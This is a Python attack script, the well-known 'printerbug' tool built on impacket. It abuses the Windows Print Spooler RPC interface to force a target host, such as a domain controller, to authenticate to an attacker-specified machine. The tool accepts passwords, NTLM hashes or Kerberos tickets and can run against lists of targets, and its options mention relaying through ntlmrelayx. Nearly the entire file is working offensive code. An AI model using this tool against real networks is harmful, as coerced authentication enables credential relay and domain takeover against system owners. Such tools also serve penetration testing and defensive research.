#!/usr/bin/env python
####################
#
# Copyright (c) 2019 Dirk-jan Mollema (@_dirkjan)
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#
# Triggers RPC call using SpoolService bug
# Credit for original POC goes to @tifkin_
#
# Author:
#  Dirk-jan Mollema (@_dirkjan)
#
####################
import sys
import logging
import argparse
import codecs

from impacket.examples.logger import ImpacketFormatter
from impacket import version
from impacket.dcerpc.v5 import transport, rprn
from impacket.dcerpc.v5.dtypes import NULL
import socket

class PrinterBug(object):
    KNOWN_PROTOCOLS = {
        139: {'bindstr': r'ncacn_np:%s[\pipe\spoolss]', 'set_host': True},
        445: {'bindstr': r'ncacn_np:%s[\pipe\spoolss]', 'set_host': True},
        }

    def __init__(self, username='', password='', domain='', port=None,
                 hashes=None, attackerhost='', ping=True, timeout=1,
                 doKerberos=False, dcHost='', targetIp=None):

        self.__username = username
        self.__password = password
        self.__port = port
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__attackerhost = attackerhost
        self.__tcp_ping = ping
        self.__tcp_timeout = timeout
        self.__doKerberos = doKerberos
        self.__dcHost = dcHost
        self.__targetIp = targetIp
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def dump(self, remote_host):

        logging.info('Attempting to trigger authentication via rprn RPC at %s', remote_host)

        stringbinding = self.KNOWN_PROTOCOLS[self.__port]['bindstr'] % remote_host
        # logging.info('StringBinding %s'%stringbinding)
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        rpctransport.set_dport(self.__port)

        if self.KNOWN_PROTOCOLS[self.__port]['set_host']:
            rpctransport.setRemoteHost(remote_host)

        if hasattr(rpctransport, 'set_credentials'):
            # This method exists only for selected protocol sequences.
            rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)
        
        if self.__doKerberos:
            rpctransport.set_kerberos(True, kdcHost=self.__dcHost)
        
        if self.__targetIp:
            rpctransport.setRemoteHost(self.__targetIp)

        try:
            self.lookup(rpctransport, remote_host)
        except Exception as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.critical("An unhandled exception has occured. Trying next host:")
            logging.critical(str(e))

    def ping(self, host):
        # Code stolen from https://github.com/fox-it/BloodHound.py/blob/1124a1b5c6f62fa6c058f7294251c7cb223e3d66/bloodhound/ad/utils.py#L126 and slightly modified by @tacticalDevC
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.__tcp_timeout)
            s.connect((host, self.__port))
            s.close()
            return True
        except KeyboardInterrupt:
            raise
        except:
            return False

    def lookup(self, rpctransport, host):
        if self.__tcp_ping and self.ping(host) is False:
            logging.info("Host is offline. Skipping!")
            return
        
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(rprn.MSRPC_UUID_RPRN)
        logging.info('Bind OK')
        try:
            resp = rprn.hRpcOpenPrinter(dce, '\\\\%s\x00' % host)
        except Exception as e:
            if str(e).find('Broken pipe') >= 0:
                # The connection timed-out. Let's try to bring it back next round
                logging.error('Connection failed - skipping host!')
                return
            elif str(e).upper().find('ACCESS_DENIED'):
                # We're not admin, bye
                logging.error('Access denied - RPC call was denied')
                dce.disconnect()
                return
            else:
                raise
        logging.info('Got handle')

        request = rprn.RpcRemoteFindFirstPrinterChangeNotificationEx()
        request['hPrinter'] =  resp['pHandle']
        request['fdwFlags'] =  rprn.PRINTER_CHANGE_ADD_JOB
        request['pszLocalMachine'] =  '\\\\%s\x00' % self.__attackerhost
        request['pOptions'] =  NULL
        try:
            resp = dce.request(request)
        except Exception as e:
            print(e)
        logging.info('Triggered RPC backconnect, this may or may not have worked')

        dce.disconnect()

        return None


# Process command-line arguments.
def main():
    # Init the example's logger theme
    handler = logging.StreamHandler(sys.stderr)
    handler.setFormatter(ImpacketFormatter())
    logging.getLogger().addHandler(handler)
    logging.getLogger().setLevel(logging.INFO)

    # Explicitly changing the stdout encoding format
    if sys.stdout.encoding is None:
        # Output is redirected to a file
        sys.stdout = codecs.getwriter('utf8')(sys.stdout)
    logging.info(version.BANNER)

    parser = argparse.ArgumentParser()

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('attackerhost', action='store', help='hostname to connect to')
    parser.add_argument("--verbose", action="store_true", help="Switch verbosity to DEBUG")

    group = parser.add_argument_group('connection')

    group.add_argument('-target-file',
                       action='store',
                       metavar="file",
                       help='Use the targets in the specified file instead of the one on'\
                            ' the command line (you must still specify something as target name)')
    group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                       help='Destination port to connect to SMB Server')
    group.add_argument("-timeout",
                        action="store",
                        metavar="timeout",
                        default=1,
                        help="Specify a timeout for the TCP ping check")
    group.add_argument("-no-ping",
                        action="store_false",
                        help="Specify if a TCP ping should be done before connection"\
                            "NOT recommended since SMB timeouts default to 300 secs and the TCP ping assures connectivity to the SMB port")

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful when proxying through ntlmrelayx)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                        '(KRB5CCNAME) based on target parameters. If valid credentials '
                        'cannot be found, it will use the ones specified in the command '
                        'line')
    group.add_argument('-dc-ip', action="store", metavar="ip address", help='IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                        help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                        'This is useful when target is the NetBIOS name or Kerberos name and you cannot resolve it')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    import re

    domain, username, password, remote_name = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
        options.target).groups('')

    #In case the password contains '@'
    if '@' in remote_name:
        password = password + '@' + remote_name.rpartition('@')[0]
        remote_name = remote_name.rpartition('@')[2]

    if options.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    if domain is None:
        domain = ''

    if options.dc_ip is None:
        dc_ip = domain
    else:
        dc_ip = options.dc_ip

    if password == '' and username != '' and options.hashes is None and options.no_pass is False:
        from getpass import getpass
        password = getpass("Password:")

    remote_names = []
    if options.target_file is not None:
        with open(options.target_file, 'r') as inf:
            for line in inf:
                remote_names.append(line.strip())
    else:
        remote_names.append(remote_name)

    lookup = PrinterBug(username, password, domain, int(options.port), options.hashes, options.attackerhost, options.no_ping, float(options.timeout), options.k, dc_ip, options.target_ip)
    for remote_name in remote_names:

        try:
            lookup.dump(remote_name)
        except KeyboardInterrupt:
            break


if __name__ == '__main__':
    main()
